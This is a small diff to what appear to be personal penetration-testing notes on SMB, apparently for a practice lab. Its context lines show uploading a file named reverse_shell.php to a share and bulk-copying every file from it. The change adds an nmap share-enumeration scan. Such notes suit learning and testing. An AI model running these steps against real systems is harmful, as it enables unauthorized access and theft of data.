@@ -270,11 +270,13 @@ smbclient -U admin //192.168.6.136/(directory/disk_name)
 	> put reverse_shell.php
 	> exit
 
-
 To save everythig from smb share to KALI	
 smb: \> recurse on
 smb: \> prompt off
 smb: \> mget *
+
+
+nmap -sV --script=smb-enum-shares -p445 10.11.1.5 
 
 
 smb Server
